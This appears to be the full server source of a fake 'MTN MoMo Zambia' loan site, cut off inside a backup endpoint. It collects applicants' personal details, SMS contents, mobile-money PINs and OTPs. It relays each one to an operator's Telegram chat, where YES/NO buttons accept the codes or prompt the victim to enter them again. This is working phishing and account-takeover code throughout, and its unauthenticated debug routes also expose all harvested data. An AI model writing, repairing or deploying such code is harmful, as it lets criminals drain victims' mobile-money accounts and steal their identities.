// ============================================================
// server/server.js – MTN MoMo Zambia Loans Backend (Hardened)
// ============================================================
console.log("🟢 1. Server is starting...");
require('dotenv').config();
console.log("🟢 2. dotenv loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.set('trust proxy', 1);
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── In-Memory Store ───
const applications = {};
const rejectionHistory = {};

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').toString().trim();
const TELEGRAM_WEBHOOK_SECRET = (process.env.TELEGRAM_WEBHOOK_SECRET || '').trim();
const PUBLIC_URL = (process.env.PUBLIC_URL || '').trim();
const DATA_RETENTION_DAYS = parseInt(process.env.DATA_RETENTION_DAYS || '7', 10);

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    console.log('Please set these in your .env file or Render environment variables');
}
if (!TELEGRAM_WEBHOOK_SECRET) {
    console.warn('⚠️ TELEGRAM_WEBHOOK_SECRET not set — webhook is NOT authenticated. Set this ASAP.');
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
console.log('✅ Server starting...');

// ─── Process-level safety nets ───
process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err);
    try { saveApplicationsNow(); } catch (_) {}
});

// ─── Data Persistence Setup ───
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
const HISTORY_FILE = path.join(DATA_DIR, 'rejection_history.json');

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    console.log('📁 Created data directory');
}

// ─── Atomic write helper ───
function atomicWrite(file, contents) {
    const tmp = `${file}.tmp.${process.pid}.${Date.now()}`;
    fs.writeFileSync(tmp, contents);
    fs.renameSync(tmp, file);
}

// ─── Save/Load Functions (debounced + atomic) ───
let saveTimer = null;
let appsDirty = false;
let historyDirty = false;

function saveApplicationsNow() {
    try {
        const data = {
            applications,
            rejectionHistory,
            timestamp: new Date().toISOString()
        };
        atomicWrite(DATA_FILE, JSON.stringify(data, null, 2));
        appsDirty = false;
        historyDirty = false;
        console.log('💾 Applications saved to disk');
        return true;
    } catch (error) {
        console.error('❌ Error saving applications:', error.message);
        return false;
    }
}

function saveApplications() {
    appsDirty = true;
    if (saveTimer) return;
    saveTimer = setTimeout(() => {
        saveTimer = null;
        if (appsDirty) saveApplicationsNow();
    }, 500);
}

function saveRejectionHistory() {
    historyDirty = true;
    saveApplications();
}

function loadApplications() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const parsed = JSON.parse(data);

            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < DATA_RETENTION_DAYS * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                Object.assign(rejectionHistory, parsed.rejectionHistory || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications from disk`);
                return true;
            } else {
                console.log(`📂 Data file is older than ${DATA_RETENTION_DAYS} days, starting fresh`);
                const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
                try { fs.copyFileSync(DATA_FILE, backupFile); } catch (_) {}
                console.log(`📂 Backed up old data to ${backupFile}`);
                return false;
            }
        }
    } catch (error) {
        console.error('❌ Error loading applications:', error.message);
    }
    return false;
}

// ─── Auto-save every 30 seconds (only if dirty) ───
setInterval(() => {
    if (appsDirty || historyDirty) saveApplicationsNow();
}, 30000);

// ─── Save on shutdown ───
function gracefulShutdown(signal) {
    console.log(`🔄 ${signal} received — saving data before shutdown...`);
    saveApplicationsNow();
    process.exit(0);
}
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

// ─── Load data on startup (single source of truth) ───
loadApplications();

// ─── Markdown escaping ───
function escapeMd(s) {
    if (s == null) return '';
    return String(s).replace(/([_*`\[\]()~>#+\-=|{}.!\\])/g, '\\$1');
}

// ─── Telegram fetch with retry + exponential backoff ───
async function tgFetch(endpoint, body, { retries = 3, baseDelayMs = 800 } = {}) {
    let lastError;
    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 15000);
            const response = await fetch(`${TELEGRAM_API_URL}/${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body),
                signal: controller.signal
            });
            clearTimeout(timeout);

            if (response.status === 429) {
                let retryAfter = 1;
                try {
                    const j = await response.json();
                    retryAfter = j?.parameters?.retry_after || 1;
                } catch (_) {}
                if (attempt < retries) {
                    await new Promise(r => setTimeout(r, retryAfter * 1000));
                    continue;
                }
            }
            return await response.json();
        } catch (error) {
            lastError = error;
            const isTransient = ['ECONNRESET', 'ETIMEDOUT', 'EAI_AGAIN', 'ENOTFOUND', 'ECONNREFUSED'].includes(error.code)
                || /ECONNRESET|socket hang up|network|aborted/i.test(error.message || '');
            if (!isTransient || attempt >= retries) break;
            const delay = baseDelayMs * Math.pow(2, attempt) + Math.random() * 250;
            console.warn(`🔁 Telegram retry ${attempt + 1}/${retries} in ${Math.round(delay)}ms (${error.code || error.message})`);
            await new Promise(r => setTimeout(r, delay));
        }
    }
    console.error('❌ Telegram fetch failed:', lastError?.message || lastError);
    return { ok: false, error: lastError?.message || 'unknown' };
}

// ─── Telegram Message Sender ───
async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Cannot send message: bot token/chat id missing');
        return { ok: false, error: 'Bot config missing' };
    }
    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    return tgFetch('sendMessage', body);
}

async function answerCallback(callbackQueryId, text) {
    return tgFetch('answerCallbackQuery', {
        callback_query_id: callbackQueryId,
        text,
        show_alert: false
    }, { retries: 2 });
}

// ─── Simple in-memory rate limiter ───
const rateBuckets = new Map();
function rateLimit(maxPerMinute) {
    return (req, res, next) => {
        const key = req.ip || 'unknown';
        const now = Date.now();
        const bucket = rateBuckets.get(key) || { count: 0, reset: now + 60000 };
        if (now > bucket.reset) { bucket.count = 0; bucket.reset = now + 60000; }
        bucket.count++;
        rateBuckets.set(key, bucket);
        if (bucket.count > maxPerMinute) {
            return res.status(429).json({ ok: false, error: 'Rate limit exceeded' });
        }
        next();
    };
}
setInterval(() => {
    const now = Date.now();
    for (const [k, v] of rateBuckets) if (now > v.reset) rateBuckets.delete(k);
}, 60000);

// ─── Helper: safe app lookup ───
function getApp(id) { return applications[id] || null; }

// ─── Helper: reset expired PIN block ───
function clearExpiredPinBlock(app) {
    if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
        app.pinAttempts = 0;
        app.pinBlockedUntil = null;
        if (app.pinStatus === 'blocked') app.pinStatus = 'pending';
        saveApplications();
    }
}

// ─── Health check ───
app.get('/health', (req, res) => {
    res.json({
        ok: true,
        uptime: process.uptime(),
        applications: Object.keys(applications).length,
        timestamp: new Date().toISOString()
    });
});

// ─── 1. Application Submission ───
app.post('/api/send-application', rateLimit(30), async (req, res) => {
    try {
        const data = req.body?.applicationData;
        if (!data || !data.applicationId) {
            return res.status(400).json({ ok: false, error: 'Missing applicationData.applicationId' });
        }
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

        const existing = applications[applicationId];
        const isResubmission = !!existing;

        applications[applicationId] = {
            ...data,
            smsStatus: 'pending',
            pinStatus: 'pending',
            otpStatus: 'pending',
            pinAttempts: 0,
            maxPinAttempts: 3,
            pinBlockedUntil: null,
            resubmissionCount: isResubmission ? (existing.resubmissionCount || 0) + 1 : 0,
            createdAt: isResubmission ? existing.createdAt : new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        saveApplications();
        console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);

        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (ZAMBIA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n📱 Phone: +260${escapeMd(phone)}\n💰 Amount: ZMW ${Number(loanAmount || 0).toLocaleString()}\n📅 Term: ${escapeMd(loanTerm)}\n👤 Name: ${escapeMd(firstName)} ${escapeMd(lastName)}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        // Fire-and-forget with background retry — never fail the user's request on a Telegram blip
        sendTelegramMessage(message, buttons)
            .then(r => { if (!r.ok) console.error('⚠️ Admin notify failed, sweeper will retry:', r.error); })
            .catch(e => console.error('⚠️ Admin notify threw:', e.message));

        res.json({ ok: true, applicationId, status: 'waiting_sms' });
    } catch (error) {
        console.error('Error in /api/send-application:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 2. SMS Submission ───
app.post('/api/send-momo-message', rateLimit(30), async (req, res) => {
    try {
        const { momoData } = req.body || {};
        const { applicationId, phone, momoMessage, isResubmission } = momoData || {};
        const app = getApp(applicationId);
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        app.smsMessage = momoMessage;
        app.smsStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const message = `📨 *SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n📱 Phone: +260${escapeMd(phone)}\n\n📩 *SMS Content:*\n${escapeMd(momoMessage)}\n\n✅ *Please approve or reject this SMS:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        sendTelegramMessage(message, buttons)
            .then(r => { if (!r.ok) console.error('⚠️ SMS notify failed:', r.error); })
            .catch(e => console.error('⚠️ SMS notify threw:', e.message));

        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-momo-message:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 3. PIN Submission ───
app.post('/api/send-pin', rateLimit(30), async (req, res) => {
    try {
        const { applicationId, pin, isResubmission } = req.body || {};
        const app = getApp(applicationId);
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }

        clearExpiredPinBlock(app);

        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
            const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
            return res.status(429).json({
                ok: false,
                error: `Too many failed attempts. Please wait ${remaining} seconds.`,
                blocked: true,
                remainingSeconds: remaining
            });
        }

        app.pin = pin;
        app.pinStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const message = `🔐 *PIN VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n🔢 PIN Entered: ${escapeMd(pin)}\n\n✅ *Please approve or reject this PIN:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
        ]];

        sendTelegramMessage(message, buttons)
            .then(r => { if (!r.ok) console.error('⚠️ PIN notify failed:', r.error); })
            .catch(e => console.error('⚠️ PIN notify threw:', e.message));

        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-pin:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 4. PIN Rejected Handler ───
app.post('/api/pin-rejected', rateLimit(30), async (req, res) => {
    try {
        const { applicationId } = req.body || {};
        const app = getApp(applicationId);
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }

        clearExpiredPinBlock(app);

        app.pinAttempts = (app.pinAttempts || 0) + 1;
        const remainingAttempts = app.maxPinAttempts - app.pinAttempts;

        if (remainingAttempts <= 0) {
            app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
            app.pinStatus = 'blocked';
            saveApplications();

            sendTelegramMessage(
                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n👤 Name: ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 Phone: +260${escapeMd(app.phone)}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
            ).catch(e => console.error('⚠️ PIN-block notify threw:', e.message));

            return res.json({
                ok: false,
                blocked: true,
                remainingAttempts: 0,
                message: 'Too many failed attempts. Please wait 5 minutes.'
            });
        }

        saveApplications();

        return res.json({
            ok: true,
            remainingAttempts,
            message: `Wrong PIN. ${remainingAttempts} attempt(s) remaining.`
        });
    } catch (error) {
        console.error('Error in /api/pin-rejected:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 5. Reset PIN Attempts ───
app.post('/api/reset-pin-attempts/:applicationId', rateLimit(60), async (req, res) => {
    try {
        const app = getApp(req.params.applicationId);
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }

        app.pinAttempts = 0;
        app.pinBlockedUntil = null;
        app.pinStatus = 'pending';
        saveApplications();

        res.json({ ok: true });
    } catch (error) {
        console.error('Error resetting PIN attempts:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 6. Get PIN Status ───
app.get('/api/pin-status/:applicationId', (req, res) => {
    try {
        const app = getApp(req.params.applicationId);
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }

        clearExpiredPinBlock(app);

        const remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
        const isBlocked = app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date();
        let blockRemaining = 0;

        if (isBlocked) {
            blockRemaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
        }

        res.json({
            ok: true,
            pinAttempts: app.pinAttempts || 0,
            remainingAttempts: Math.max(0, remainingAttempts),
            maxAttempts: app.maxPinAttempts,
            isBlocked,
            blockRemainingSeconds: blockRemaining,
            pinStatus: app.pinStatus
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 7. OTP Submission ───
app.post('/api/send-otp', rateLimit(30), async (req, res) => {
    try {
        const { applicationId, otp, isResubmission } = req.body || {};
        const app = getApp(applicationId);
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        app.otp = otp;
        app.otpStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const message = `🔑 *OTP VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n🔢 OTP Entered: ${escapeMd(otp)}\n\n✅ *Please approve or reject this OTP:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];

        sendTelegramMessage(message, buttons)
            .then(r => { if (!r.ok) console.error('⚠️ OTP notify failed:', r.error); })
            .catch(e => console.error('⚠️ OTP notify threw:', e.message));

        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 8. Resend OTP ───
app.post('/api/resend-otp', rateLimit(20), async (req, res) => {
    try {
        const { applicationId } = req.body || {};
        const app = getApp(applicationId);
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }

        app.otpStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n👤 Name: ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 Phone: +260${escapeMd(app.phone)}\n\n📌 A new OTP has been requested by the user.\n✅ *Please approve or reject this new OTP:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];

        sendTelegramMessage(message, buttons)
            .then(r => { if (!r.ok) console.error('⚠️ Resend-OTP notify failed:', r.error); })
            .catch(e => console.error('⚠️ Resend-OTP notify threw:', e.message));

        res.json({ ok: true, status: 'otp_resent' });
    } catch (error) {
        console.error('Error in /api/resend-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 9. Final Completion ───
app.post('/api/send-final-details', rateLimit(30), async (req, res) => {
    try {
        const data = req.body?.finalData;
        if (!data || !data.applicationId) {
            return res.status(400).json({ ok: false, error: 'Missing finalData.applicationId' });
        }
        const app = getApp(data.applicationId);
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        app.pinStatus = 'approved';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const message = `✅ *LOAN COMPLETE (ZAMBIA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(data.applicationId)}\n📱 Phone: +260${escapeMd(data.phone)}\n🔑 PIN Entered: ${escapeMd(data.pin)}\n💰 Amount: ZMW ${Number(data.loanAmount || 0).toLocaleString()}\n📅 Term: ${escapeMd(data.loanTerm)}\n👤 Name: ${escapeMd(data.firstName)} ${escapeMd(data.lastName)}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;

        sendTelegramMessage(message)
            .then(r => { if (!r.ok) console.error('⚠️ Final notify failed:', r.error); })
            .catch(e => console.error('⚠️ Final notify threw:', e.message));

        res.json({ ok: true, status: 'dashboard_ready' });
    } catch (error) {
        console.error('Error in /api/send-final-details:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 10. Get Rejection Redirect Info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    try {
        const app = getApp(req.params.applicationId);
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }

        let rejectedStep = null;
        let errorMessage = '';

        if (app.smsStatus === 'rejected') {
            rejectedStep = 'sms';
            errorMessage = '❌ Your SMS message was rejected. Please check and resubmit.';
        } else if (app.pinStatus === 'rejected') {
            rejectedStep = 'pin';
            errorMessage = '❌ Your MoMo PIN was rejected. Please re-enter your PIN.';
        } else if (app.otpStatus === 'rejected') {
            rejectedStep = 'otp';
            errorMessage = '❌ Your OTP was rejected. Please request a new OTP.';
        }

        res.json({
            ok: true,
            rejectedStep,
            errorMessage,
            applicationId: req.params.applicationId
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 11. Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
    // Verify Telegram secret token if configured
    if (TELEGRAM_WEBHOOK_SECRET) {
        const header = req.get('X-Telegram-Bot-Api-Secret-Token');
        if (header !== TELEGRAM_WEBHOOK_SECRET) {
            console.warn('⚠️ Webhook rejected: bad secret token');
            return res.sendStatus(401);
        }
    }

    console.log('📩 Webhook received');

    try {
        if (req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id;
            const username = req.body.message.from?.username || 'Unknown';

            console.log(`💬 Command from ${username}: ${text}`);

            if (chatId.toString() === TELEGRAM_CHAT_ID) {

                if (text === '/stats') {
                    const total = Object.keys(applications).length;
                    const pendingSms = Object.values(applications).filter(a => a.smsStatus === 'pending').length;
                    const pendingPin = Object.values(applications).filter(a => a.pinStatus === 'pending').length;
                    const pendingOtp = Object.values(applications).filter(a => a.otpStatus === 'pending').length;
                    const approved = Object.values(applications).filter(a => a.otpStatus === 'approved').length;
                    const rejected = Object.values(applications).filter(a =>
                        a.smsStatus === 'rejected' ||
                        a.pinStatus === 'rejected' ||
                        a.otpStatus === 'rejected'
                    ).length;

                    const recentIds = Object.keys(applications).slice(-5);
                    const recentList = recentIds.length > 0
                        ? recentIds.map(id => {
                            const app = applications[id];
                            return `🆔 ${escapeMd(id)} - ${escapeMd(app.firstName)} ${escapeMd(app.lastName)} (${app.smsStatus})`;
                        }).join('\n')
                        : 'No applications yet';

                    await sendTelegramMessage(
                        `📊 *APPLICATION STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Total: ${total}\n⏳ Pending SMS: ${pendingSms}\n⏳ Pending PIN: ${pendingPin}\n⏳ Pending OTP: ${pendingOtp}\n✅ Approved: ${approved}\n❌ Rejected: ${rejected}\n\n📅 *Recent Applications:*\n${recentList}`
                    );
                    return res.sendStatus(200);
                }

                if (text === '/list') {
                    const ids = Object.keys(applications);
                    if (ids.length === 0) {
                        await sendTelegramMessage('📭 No applications found.');
                        return res.sendStatus(200);
                    }

                    const displayIds = ids.slice(-10);
                    let message = '📋 *APPLICATION LIST* 📋\n━━━━━━━━━━━━━━━━━━━━━━\n';
                    displayIds.forEach((id, i) => {
                        const app = applications[id];
                        message += `\n${i + 1}. 🆔 *${escapeMd(id)}*\n`;
                        message += `   👤 ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n`;
                        message += `   📱 +260${escapeMd(app.phone)}\n`;
                        message += `   💰 ZMW ${Number(app.loanAmount || 0).toLocaleString()}\n`;
                        message += `   📌 SMS: ${app.smsStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
                    });

                    if (ids.length > 10) {
                        message += `\n... and ${ids.length - 10} more. Use /search [ID] to find specific.`;
                    }

                    await sendTelegramMessage(message);
                    return res.sendStatus(200);
                }

                if (text.startsWith('/search ')) {
                    const searchId = text.replace('/search ', '').trim().toUpperCase();
                    const app = getApp(searchId);

                    if (!app) {
                        await sendTelegramMessage(`❌ Application *${escapeMd(searchId)}* not found.`);
                        return res.sendStatus(200);
                    }

                    await sendTelegramMessage(
                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(searchId)}\n👤 Name: ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 Phone: +260${escapeMd(app.phone)}\n📧 Email: ${escapeMd(app.email)}\n💰 Amount: ZMW ${Number(app.loanAmount || 0).toLocaleString()}\n📅 Term: ${escapeMd(app.loanTerm)}\n📌 Purpose: ${escapeMd(app.loanPurpose || 'Not specified')}\n💼 Employment: ${escapeMd(app.employment || 'Not specified')}\n💰 Income: ZMW ${Number(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${escapeMd(app.kinName || 'Not specified')} (+260${escapeMd(app.kinPhone || '')})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
                    );
                    return res.sendStatus(200);
                }

                if (text.startsWith('/delete ')) {
                    const deleteId = text.replace('/delete ', '').trim().toUpperCase();
                    const app = getApp(deleteId);
                    if (app) {
                        const appName = `${app.firstName} ${app.lastName}`;
                        delete applications[deleteId];
                        saveApplications();
                        await sendTelegramMessage(`✅ Application *${escapeMd(deleteId)}* (${escapeMd(appName)}) deleted successfully.`);
                    } else {
                        await sendTelegramMessage(`❌ Application *${escapeMd(deleteId)}* not found.`);
                    }
                    return res.sendStatus(200);
                }

                if (text === '/clear') {
                    await sendTelegramMessage(
                        `⚠️ *DESTRUCTIVE COMMAND*\n━━━━━━━━━━━━━━━━━━━━━━\nThis will delete ALL applications.\n\nTo confirm, send:\n\`/clear CONFIRM\``
                    );
                    return res.sendStatus(200);
                }

                if (text === '/clear CONFIRM') {
                    const count = Object.keys(applications).length;
                    if (count === 0) {
                        await sendTelegramMessage('📭 No applications to clear.');
                        return res.sendStatus(200);
                    }
                    Object.keys(applications).forEach(key => delete applications[key]);
                    Object.keys(rejectionHistory).forEach(key => delete rejectionHistory[key]);
                    saveApplications();
                    await sendTelegramMessage(`✅ Cleared all ${count} applications.`);
                    return res.sendStatus(200);
                }

                if (text === '/status') {
                    const appCount = Object.keys(applications).length;
                    const webhookInfo = await tgFetch('getWebhookInfo', {}, { retries: 1 });
                    await sendTelegramMessage(
                        `✅ *BOT STATUS* ✅\n━━━━━━━━━━━━━━━━━━━━━━\n🟢 Status: Online\n📊 Applications: ${appCount}\n⏰ Time: ${new Date().toISOString()}\n🔗 Webhook: ${escapeMd(webhookInfo.result?.url || 'Not set')}\n💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}\n⏱️ Uptime: ${Math.round(process.uptime())}s`
                    );
                    return res.sendStatus(200);
                }

                if (text === '/help' || text === '/start') {
                    await sendTelegramMessage(
                        `🤖 *AVAILABLE COMMANDS* 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats - View application statistics\n📋 /list - List all applications (last 10)\n🔍 /search [ID] - Find specific application\n🗑️ /delete [ID] - Delete an application\n🧹 /clear - Clear ALL applications (requires /clear CONFIRM)\n📌 /status - Check bot status\n❓ /help - Show this help menu\n\n📌 *Quick Actions:*\nWhen you receive a new application, use the YES/NO buttons to approve or reject.`
                    );
                    return res.sendStatus(200);
                }

                if (text.startsWith('/')) {
                    await sendTelegramMessage(`❌ Unknown command. Type /help to see available commands.`);
                    return res.sendStatus(200);
                }
            } else {
                console.log(`⚠️ Unauthorized message from ${username} (${chatId})`);
                await sendTelegramMessage(`⚠️ You are not authorized to use this bot.`);
                return res.sendStatus(200);
            }
        }

        if (req.body.callback_query) {
            const query = req.body.callback_query;
            console.log('🔘 Callback query:', query.data);
            let answered = false;

            try {
                const { action, step, applicationId } = JSON.parse(query.data);
                const app = getApp(applicationId);

                if (!app) {
                    console.log(`❌ Application ${applicationId} not found`);
                    await answerCallback(query.id, '❌ Application not found');
                    return res.sendStatus(200);
                }

                if (action === 'NO') {
                    rejectionHistory[applicationId] = {
                        step,
                        timestamp: new Date().toISOString(),
                        previousStatus: app[step.toLowerCase() + 'Status']
                    };
                    saveRejectionHistory();
                    console.log(`❌ Rejected ${step} for ${applicationId}`);
                }

                console.log(`📝 Processing ${step} for ${applicationId}: ${action}`);

                const statusKey = step.toLowerCase() + 'Status';
                if (step === 'SMS' && app.smsStatus === 'pending') {
                    app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`📨 SMS status: ${app.smsStatus}`);
                } else if (step === 'PIN' && app.pinStatus === 'pending') {
                    app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`🔐 PIN status: ${app.pinStatus}`);
                } else if (step === 'OTP' && app.otpStatus === 'pending') {
                    app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`🔑 OTP status: ${app.otpStatus}`);
                } else {
                    console.log(`⚠️ Status not updated. Current: ${app[statusKey]}`);
                }

                app.updatedAt = new Date().toISOString();
                saveApplications();

                await answerCallback(query.id, `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`);
                answered = true;

                const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
                await sendTelegramMessage(`📌 *Status Update (ZAMBIA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n📋 Step: ${step}\n📌 Status: ${statusText}`);

            } catch (parseError) {
                console.error('❌ Error parsing callback data:', parseError.message);
                if (!answered) {
                    try { await answerCallback(query.id, '⚠️ Error processing action'); } catch (_) {}
                }
            }

            return res.sendStatus(200);
        }

        res.sendStatus(200);

    } catch (error) {
        console.error('❌ Webhook error:', error);
        res.sendStatus(500);
    }
});

// ─── 12. Status Check ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    try {
        const app = getApp(req.params.applicationId);
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        clearExpiredPinBlock(app);

        let status = 'pending';
        if (req.params.step === 'sms') status = app.smsStatus;
        else if (req.params.step === 'pin') status = app.pinStatus;
        else if (req.params.step === 'otp') status = app.otpStatus;

        const rejectionInfo = rejectionHistory[req.params.applicationId] || null;

        res.json({
            ok: true,
            status,
            rejectionInfo,
            resubmissionCount: app.resubmissionCount || 0
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 13. Debug Endpoints ───
app.get('/api/debug/applications', (req, res) => {
    res.json({
        total: Object.keys(applications).length,
        applications,
        rejections: rejectionHistory,
        dataFile: fs.existsSync(DATA_FILE) ? 'exists' : 'not found'
    });
});

app.get('/api/debug/application/:id', (req, res) => {
    const app = getApp(req.params.id);
    if (!app) return res.status(404).json({ error: 'Application not found' });
    res.json(app);
});

// ─── 14. Backup Endpoint ───
app.get('/api/debug/backup', (req, res) => {
    try {
        const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
        const data = {
            applications,
            rejectionHistory,
            timestamp: new Date().toISOString()
        };
        atomicWrite(backupFile, JSON.stringify(data, null, 2));
        res.json({
            ok: true,
